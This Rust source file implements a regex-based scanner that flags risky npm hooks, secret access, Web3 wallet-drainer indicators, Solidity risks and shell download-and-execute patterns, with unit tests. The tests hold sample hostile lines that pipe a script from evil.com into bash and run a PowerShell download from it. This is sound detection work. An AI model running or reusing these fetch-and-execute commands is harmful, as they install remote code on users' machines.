use regex::Regex;
use super::types::{Category, PatternRule, Severity};

/// Build all pattern rules for the scanner
pub fn build_pattern_rules() -> Vec<PatternRule> {
    let mut rules = Vec::new();

    // =============================================
    // Package.json risky scripts (HookExecutionRisk)
    // =============================================
    rules.push(PatternRule {
        id: "pkg-preinstall".into(),
        severity: Severity::High,
        category: Category::HookExecutionRisk,
        description: "Risky preinstall script found in package.json".into(),
        recommendation: "Inspect the preinstall script before running npm install. Malicious packages often abuse lifecycle hooks.".into(),
        pattern: Regex::new(r#""preinstall"\s*:\s*""#).unwrap(),
    });

    rules.push(PatternRule {
        id: "pkg-install".into(),
        severity: Severity::High,
        category: Category::HookExecutionRisk,
        description: "Risky install script found in package.json".into(),
        recommendation: "Review the install script carefully. This hook runs automatically during npm install.".into(),
        pattern: Regex::new(r#""install"\s*:\s*"[^"]+""#).unwrap(),
    });

    rules.push(PatternRule {
        id: "pkg-postinstall".into(),
        severity: Severity::High,
        category: Category::HookExecutionRisk,
        description: "Risky postinstall script found in package.json".into(),
        recommendation: "Inspect the postinstall script before running npm install. Many supply-chain attacks use postinstall hooks.".into(),
        pattern: Regex::new(r#""postinstall"\s*:\s*""#).unwrap(),
    });

    rules.push(PatternRule {
        id: "pkg-prepare".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "Prepare script found in package.json".into(),
        recommendation: "Review the prepare script. While common for build steps, it can be abused for code execution.".into(),
        pattern: Regex::new(r#""prepare"\s*:\s*""#).unwrap(),
    });

    rules.push(PatternRule {
        id: "pkg-prestart".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "Prestart lifecycle script found in package.json".into(),
        recommendation: "Review the prestart script. It runs automatically before the start command.".into(),
        pattern: Regex::new(r#""prestart"\s*:\s*""#).unwrap(),
    });

    // =============================================
    // JS/TS execution patterns (HookExecutionRisk)
    // =============================================
    rules.push(PatternRule {
        id: "js-child-process".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "child_process module usage detected — code execution warning".into(),
        recommendation: "Review why child_process is used. This module can execute arbitrary commands on the system.".into(),
        pattern: Regex::new(r#"(?:require\s*\(\s*['"]child_process['"]|from\s+['"]child_process['"])"#).unwrap(),
    });

    rules.push(PatternRule {
        id: "js-exec".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "exec() call detected — command execution warning".into(),
        recommendation: "Avoid using exec() with untrusted input. Use safer alternatives or validate all inputs.".into(),
        pattern: Regex::new(r"\bexec\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "js-spawn".into(),
        severity: Severity::Low,
        category: Category::HookExecutionRisk,
        description: "spawn() call detected — process creation".into(),
        recommendation: "Review spawn() usage. Ensure it is not used to execute user-controlled or untrusted commands.".into(),
        pattern: Regex::new(r"\bspawn\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "js-eval".into(),
        severity: Severity::High,
        category: Category::HookExecutionRisk,
        description: "eval() usage detected — dynamic execution warning".into(),
        recommendation: "Never use eval() with untrusted input. Use JSON.parse() or a sandboxed execution environment.".into(),
        pattern: Regex::new(r"\beval\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "js-function-constructor".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "Function constructor detected — dynamic code execution".into(),
        recommendation: "Avoid new Function() as it is equivalent to eval(). Use explicit function definitions.".into(),
        pattern: Regex::new(r"new\s+Function\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "js-env-read".into(),
        severity: Severity::Low,
        category: Category::SecretHandlingWarning,
        description: "Reading .env file detected — sensitive configuration warning".into(),
        recommendation: "Check why .env files are read directly. Use environment variables via process.env instead.".into(),
        pattern: Regex::new(r#"readFileSync\s*\(\s*['"]\.\s*env"#).unwrap(),
    });

    rules.push(PatternRule {
        id: "js-private-key-env".into(),
        severity: Severity::Low,
        category: Category::SecretHandlingWarning,
        description: "process.env.PRIVATE_KEY access detected — sensitive configuration warning".into(),
        recommendation: "Ensure private keys are handled securely. Never log or transmit private keys.".into(),
        pattern: Regex::new(r"process\.env\.PRIVATE_KEY").unwrap(),
    });

    rules.push(PatternRule {
        id: "js-mnemonic-env".into(),
        severity: Severity::Low,
        category: Category::SecretHandlingWarning,
        description: "process.env.MNEMONIC access detected — sensitive configuration warning".into(),
        recommendation: "Ensure mnemonic phrases are handled securely. Never log or transmit seed phrases.".into(),
        pattern: Regex::new(r"process\.env\.MNEMONIC").unwrap(),
    });

    rules.push(PatternRule {
        id: "js-seed-phrase-env".into(),
        severity: Severity::Low,
        category: Category::SecretHandlingWarning,
        description: "process.env.SEED_PHRASE access detected — sensitive configuration warning".into(),
        recommendation: "Ensure seed phrases are handled securely. Never expose seed phrases in code.".into(),
        pattern: Regex::new(r"process\.env\.SEED_PHRASE").unwrap(),
    });

    // =============================================
    // Web3 / Wallet-drainer patterns
    // =============================================
    rules.push(PatternRule {
        id: "web3-approval-all".into(),
        severity: Severity::High,
        category: Category::Web3AuditRisk,
        description: "setApprovalForAll detected — potential audit risk".into(),
        recommendation: "Verify setApprovalForAll usage. This grants full access to all tokens of a collection.".into(),
        pattern: Regex::new(r"setApprovalForAll").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-approve-max".into(),
        severity: Severity::Medium,
        category: Category::Web3AuditRisk,
        description: "Approve with MaxUint256 detected — potential audit risk".into(),
        recommendation: "Avoid approving MaxUint256 where unnecessary. Use specific amounts to limit potential exposure.".into(),
        pattern: Regex::new(r"approve.*(?:MaxUint256|type\s*\(\s*uint256\s*\)\s*\.max|2\s*\*\*\s*256\s*-\s*1|0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-permit-abuse".into(),
        severity: Severity::Medium,
        category: Category::Web3AuditRisk,
        description: "Permit signature pattern detected — potential audit risk".into(),
        recommendation: "Review permit usage carefully. Permit signatures can be used to authorize transfers without transactions.".into(),
        pattern: Regex::new(r"(?:signTypedData|_signTypedData|permit\s*\().*(?:deadline|nonce|spender)").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-transfer-loop".into(),
        severity: Severity::High,
        category: Category::Web3AuditRisk,
        description: "transferFrom in loop detected — potential audit risk".into(),
        recommendation: "Review transferFrom loops. Ensure they are not vulnerable to batch drain patterns.".into(),
        pattern: Regex::new(r"(?:for|while)\s*\(.*\)\s*\{[^}]*transferFrom").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-transfer-from".into(),
        severity: Severity::Medium,
        category: Category::Web3AuditRisk,
        description: "transferFrom call detected — potential audit risk".into(),
        recommendation: "Ensure transferFrom has appropriate access control and check spender authorization.".into(),
        pattern: Regex::new(r"\.transferFrom\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-from-mnemonic".into(),
        severity: Severity::High,
        category: Category::SecretHandlingWarning,
        description: "Wallet.fromMnemonic detected — key recovery risk".into(),
        recommendation: "Ensure Wallet.fromMnemonic is used safely. Never process user mnemonics in client-side code without encryption.".into(),
        pattern: Regex::new(r"(?:Wallet|HDNodeWallet)\.from(?:Mnemonic|Phrase)").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-hardcoded-key".into(),
        severity: Severity::Critical,
        category: Category::SecretHandlingWarning,
        description: "Hardcoded private key pattern detected — severe threat".into(),
        recommendation: "Never hardcode private keys. Use environment variables, hardware wallets, or secure key management.".into(),
        pattern: Regex::new(r#"(?:private[_\s]?key|privateKey|PRIVATE_KEY)\s*[:=]\s*["']0x[a-fA-F0-9]{64}["']"#).unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-wallet-extension".into(),
        severity: Severity::Critical,
        category: Category::MaliciousIndicator,
        description: "Browser wallet extension path access detected — severe threat".into(),
        recommendation: "Accessing browser wallet extension local storage indicates an attempt to steal credentials.".into(),
        pattern: Regex::new(r"(?:chrome-extension://|moz-extension://|\.sollet|\.phantom|MetaMask.*Local\s*Storage)").unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-mnemonic-access".into(),
        severity: Severity::Critical,
        category: Category::MaliciousIndicator,
        description: "Mnemonic/seed phrase string pattern detected — severe threat".into(),
        recommendation: "Raw mnemonic phrases detected in source code. Ensure this is not used to exfiltrate wallet credentials.".into(),
        pattern: Regex::new(r#"(?:mnemonic|seed[_\s]?phrase|recovery[_\s]?phrase)\s*[:=]\s*["'][a-z\s]{20,}["']"#).unwrap(),
    });

    rules.push(PatternRule {
        id: "web3-permit-signature".into(),
        severity: Severity::Medium,
        category: Category::Web3AuditRisk,
        description: "EIP-2612 permit signature detected — potential audit risk".into(),
        recommendation: "Permit signatures allow token approvals without gas. Verify gasless approval permissions.".into(),
        pattern: Regex::new(r"(?:PERMIT_TYPEHASH|EIP712|nonces\s*\[|permit\s*\([^)]*deadline)").unwrap(),
    });

    // =============================================
    // Solidity risk patterns (SolidityAuditRisk)
    // =============================================
    rules.push(PatternRule {
        id: "sol-tx-origin".into(),
        severity: Severity::Medium,
        category: Category::SolidityAuditRisk,
        description: "tx.origin used for authorization — phishing vulnerability".into(),
        recommendation: "Replace tx.origin with msg.sender. tx.origin can be exploited via malicious contract calls.".into(),
        pattern: Regex::new(r"\btx\.origin\b").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-delegatecall".into(),
        severity: Severity::High,
        category: Category::SolidityAuditRisk,
        description: "delegatecall usage detected — potential proxy upgrade risk".into(),
        recommendation: "Review delegatecall targets. Ensure targets are authenticated and cannot be hijacked.".into(),
        pattern: Regex::new(r"\.delegatecall\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-selfdestruct".into(),
        severity: Severity::High,
        category: Category::SolidityAuditRisk,
        description: "selfdestruct/SELFDESTRUCT detected — contract can be destroyed".into(),
        recommendation: "Avoid selfdestruct in production contracts. It permanently destroys contract logic and state.".into(),
        pattern: Regex::new(r"\b(?:selfdestruct|SELFDESTRUCT)\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-unchecked-call".into(),
        severity: Severity::High,
        category: Category::SolidityAuditRisk,
        description: "Unchecked low-level call detected — reentrancy risk".into(),
        recommendation: "Always check the return value of low-level calls. Ensure strict reentrancy guards are used.".into(),
        pattern: Regex::new(r"\.call\s*[\({]").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-owner-withdraw".into(),
        severity: Severity::Low,
        category: Category::SolidityAuditRisk,
        description: "Owner-only withdraw pattern detected".into(),
        recommendation: "Review withdrawal controls. Ensure withdrawal logic follows the pull-payment pattern.".into(),
        pattern: Regex::new(r"(?:onlyOwner|owner\s*==\s*msg\.sender).*withdraw").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-mint-internal".into(),
        severity: Severity::Low,
        category: Category::Informational,
        description: "Internal mint function detected — standard utility".into(),
        recommendation: "Ensure internal mint functions can only be called by trusted external interfaces.".into(),
        pattern: Regex::new(r"function\s+_mint\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-mint-public".into(),
        severity: Severity::Medium,
        category: Category::SolidityAuditRisk,
        description: "Public mint function detected — centralization control risk".into(),
        recommendation: "Verify that public mint functions have robust access controls (e.g. onlyOwner or onlyRole).".into(),
        pattern: Regex::new(r"function\s+mint\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-blacklist".into(),
        severity: Severity::Medium,
        category: Category::SolidityAuditRisk,
        description: "Blacklist function detected — centralized control risk".into(),
        recommendation: "Review blacklist functionality. Centralized blocklist controls can freeze user wallets.".into(),
        pattern: Regex::new(r"(?:blacklist|blocklist|denylist)\s*\[").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-pause-unpause".into(),
        severity: Severity::Low,
        category: Category::SolidityAuditRisk,
        description: "Pause/unpause functions detected — centralized control risk".into(),
        recommendation: "Review pause controls. Centralized pausing can block operations temporarily.".into(),
        pattern: Regex::new(r"function\s+(?:pause|unpause|_pause|_unpause)\s*\(").unwrap(),
    });

    rules.push(PatternRule {
        id: "sol-proxy-admin".into(),
        severity: Severity::Medium,
        category: Category::SolidityAuditRisk,
        description: "Proxy admin upgrade pattern detected — upgrade risk".into(),
        recommendation: "Verify proxy admin controls. Unauthorized upgrades can replace implementation logic.".into(),
        pattern: Regex::new(r"(?:upgradeTo|upgradeToAndCall|_authorizeUpgrade)\s*\(").unwrap(),
    });

    // =============================================
    // Hook scripts (HookExecutionRisk)
    // =============================================
    rules.push(PatternRule {
        id: "hook-husky".into(),
        severity: Severity::Low,
        category: Category::HookExecutionRisk,
        description: "Husky git hook configuration detected".into(),
        recommendation: "Review .husky/ hook scripts. Git hooks execute automatically during commit workflow.".into(),
        pattern: Regex::new(r"(?:\.husky/|husky\s+install)").unwrap(),
    });

    rules.push(PatternRule {
        id: "hook-pre-commit".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "Pre-commit hook script detected".into(),
        recommendation: "Review pre-commit scripts. They execute automatically before committing code.".into(),
        pattern: Regex::new(r"pre-commit").unwrap(),
    });

    rules.push(PatternRule {
        id: "hook-pre-push".into(),
        severity: Severity::Medium,
        category: Category::HookExecutionRisk,
        description: "Pre-push hook script detected".into(),
        recommendation: "Review pre-push scripts. They run before pushing code to remote.".into(),
        pattern: Regex::new(r"pre-push").unwrap(),
    });

    rules.push(PatternRule {
        id: "hook-commit-msg".into(),
        severity: Severity::Low,
        category: Category::HookExecutionRisk,
        description: "Commit-msg hook script detected".into(),
        recommendation: "Review commit-msg script logic for arbitrary code executions.".into(),
        pattern: Regex::new(r"commit-msg").unwrap(),
    });

    // =============================================
    // CI/CD pipelines (CiCdWarning)
    // =============================================
    rules.push(PatternRule {
        id: "ci-github-actions".into(),
        severity: Severity::Low,
        category: Category::CiCdWarning,
        description: "GitHub Actions workflow detected".into(),
        recommendation: "Review GitHub Actions workflows for suspicious actions, secret access, or remote downloads.".into(),
        pattern: Regex::new(r"(?:uses:\s*actions/|runs-on:\s*|github\.event)").unwrap(),
    });

    rules.push(PatternRule {
        id: "ci-jenkinsfile".into(),
        severity: Severity::Low,
        category: Category::CiCdWarning,
        description: "Jenkinsfile pipeline configuration detected".into(),
        recommendation: "Review Jenkinsfiles for suspicious shell stages or credential bindings.".into(),
        pattern: Regex::new(r"(?:pipeline\s*\{|agent\s+any|stage\s*\()").unwrap(),
    });

    // =============================================
    // Shell scripts (MaliciousIndicator or HookExecutionRisk)
    // =============================================
    rules.push(PatternRule {
        id: "shell-curl-exec".into(),
        severity: Severity::Critical,
        category: Category::MaliciousIndicator,
        description: "curl piped to shell execution detected — remote code execution risk".into(),
        recommendation: "Never pipe curl output directly to sh/bash/zsh. Download and audit scripts first.".into(),
        pattern: Regex::new(r"curl\s+.*\|\s*(?:sh|bash|zsh|powershell)").unwrap(),
    });

    rules.push(PatternRule {
        id: "shell-wget-exec".into(),
        severity: Severity::Critical,
        category: Category::MaliciousIndicator,
        description: "wget piped to shell execution detected — remote code execution risk".into(),
        recommendation: "Never pipe wget output directly to shell processes.".into(),
        pattern: Regex::new(r"wget\s+.*\|\s*(?:sh|bash|zsh)").unwrap(),
    });

    rules.push(PatternRule {
        id: "shell-ps-invoke".into(),
        severity: Severity::Critical,
        category: Category::MaliciousIndicator,
        description: "Suspicious PowerShell execution pattern detected — severe threat".into(),
        recommendation: "Review PowerShell scripts using Invoke-Expression, IEX, or base64 downloads.".into(),
        pattern: Regex::new(r"(?i)(?:Invoke-Expression|IEX\s*\(|DownloadString|encodedcommand|-enc\s)").unwrap(),
    });

    rules.push(PatternRule {
        id: "shell-base64-decode".into(),
        severity: Severity::High,
        category: Category::HookExecutionRisk,
        description: "Base64 decode execution pattern detected — obfuscated code warning".into(),
        recommendation: "Review base64 decoding logic. Obfuscated scripts can hide malicious logic.".into(),
        pattern: Regex::new(r#"(?:base64\s+(?:-d|--decode)|atob\s*\(|Buffer\.from\s*\([^)]+,\s*['"]base64['"])"#).unwrap(),
    });

    // =============================================
    // Outbound network request capability
    // =============================================
    rules.push(PatternRule {
        id: "js-network-request".into(),
        severity: Severity::Low,
        category: Category::Informational,
        description: "Outbound network request capability detected".into(),
        recommendation: "Review network communications. Legitimate applications connect to external APIs, but this can also exfiltrate keys.".into(),
        pattern: Regex::new(r"\b(?:fetch|axios|http\.request|https\.request|websocket|socket\.io)\b").unwrap(),
    });

    rules
}

/// Scan content against all pattern rules, returning findings
pub fn scan_content(
    content: &str,
    file_path: &str,
    scan_id: &str,
    rules: &[PatternRule],
) -> Vec<super::types::Finding> {
    let mut findings = Vec::new();

    for rule in rules {
        for (line_idx, line) in content.lines().enumerate() {
            if rule.pattern.is_match(line) {
                let matched = line.trim().to_string();
                let truncated = if matched.len() > 200 {
                    format!("{}...", &matched[..200])
                } else {
                    matched
                };

                findings.push(super::types::Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: rule.id.clone(),
                    severity: rule.severity.clone(),
                    category: rule.category.clone(),
                    description: rule.description.clone(),
                    file_path: file_path.to_string(),
                    line_number: Some((line_idx + 1) as u32),
                    matched_content: Some(truncated),
                    recommendation: rule.recommendation.clone(),
                });
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detects_eval() {
        let rules = build_pattern_rules();
        let content = r#"const result = eval(userInput);"#;
        let findings = scan_content(content, "test.js", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "js-eval"));
    }

    #[test]
    fn test_detects_child_process() {
        let rules = build_pattern_rules();
        let content = r#"const { exec } = require('child_process');"#;
        let findings = scan_content(content, "test.js", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "js-child-process"));
    }

    #[test]
    fn test_detects_set_approval_for_all() {
        let rules = build_pattern_rules();
        let content = r#"await contract.setApprovalForAll(spender, true);"#;
        let findings = scan_content(content, "test.ts", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "web3-approval-all"));
    }

    #[test]
    fn test_detects_selfdestruct() {
        let rules = build_pattern_rules();
        let content = "selfdestruct(payable(owner));";
        let findings = scan_content(content, "Contract.sol", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "sol-selfdestruct"));
    }

    #[test]
    fn test_detects_delegatecall() {
        let rules = build_pattern_rules();
        let content = "address(target).delegatecall(data);";
        let findings = scan_content(content, "Proxy.sol", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "sol-delegatecall"));
    }

    #[test]
    fn test_detects_tx_origin() {
        let rules = build_pattern_rules();
        let content = "require(tx.origin == owner);";
        let findings = scan_content(content, "Auth.sol", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "sol-tx-origin"));
    }

    #[test]
    fn test_detects_private_key_env() {
        let rules = build_pattern_rules();
        let content = r#"const key = process.env.PRIVATE_KEY;"#;
        let findings = scan_content(content, "config.ts", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "js-private-key-env"));
    }

    #[test]
    fn test_detects_postinstall() {
        let rules = build_pattern_rules();
        let content = r#""postinstall": "node scripts/setup.js""#;
        let findings = scan_content(content, "package.json", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "pkg-postinstall"));
    }

    #[test]
    fn test_no_false_positive_on_clean_code() {
        let rules = build_pattern_rules();
        let content = r#"
            const greeting = "Hello, world!";
            function add(a, b) { return a + b; }
            console.log(greeting);
        "#;
        let findings = scan_content(content, "clean.js", "test-scan", &rules);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_hardcoded_private_key() {
        let rules = build_pattern_rules();
        let content = r#"const privateKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";"#;
        let findings = scan_content(content, "config.js", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "web3-hardcoded-key"));
    }

    #[test]
    fn test_detects_curl_pipe() {
        let rules = build_pattern_rules();
        let content = r#"curl https://evil.com/script.sh | bash"#;
        let findings = scan_content(content, "setup.sh", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "shell-curl-exec"));
    }

    #[test]
    fn test_detects_powershell_invoke() {
        let rules = build_pattern_rules();
        let content = r#"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"#;
        let findings = scan_content(content, "setup.ps1", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "shell-ps-invoke"));
    }

    #[test]
    fn test_detects_pause_unpause() {
        let rules = build_pattern_rules();
        let content = "function pause() external onlyOwner {";
        let findings = scan_content(content, "Token.sol", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "sol-pause-unpause"));
    }

    #[test]
    fn test_detects_proxy_admin() {
        let rules = build_pattern_rules();
        let content = "function upgradeTo(address newImplementation) external {";
        let findings = scan_content(content, "Proxy.sol", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "sol-proxy-admin"));
    }

    #[test]
    fn test_detects_wallet_extension_path() {
        let rules = build_pattern_rules();
        let content = r#"const path = "chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/popup.html";"#;
        let findings = scan_content(content, "steal.js", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "web3-wallet-extension"));
    }

    #[test]
    fn test_detects_transfer_from() {
        let rules = build_pattern_rules();
        let content = "token.transferFrom(victim, attacker, amount);";
        let findings = scan_content(content, "drain.js", "test-scan", &rules);
        assert!(findings.iter().any(|f| f.pattern_id == "web3-transfer-from"));
    }
}
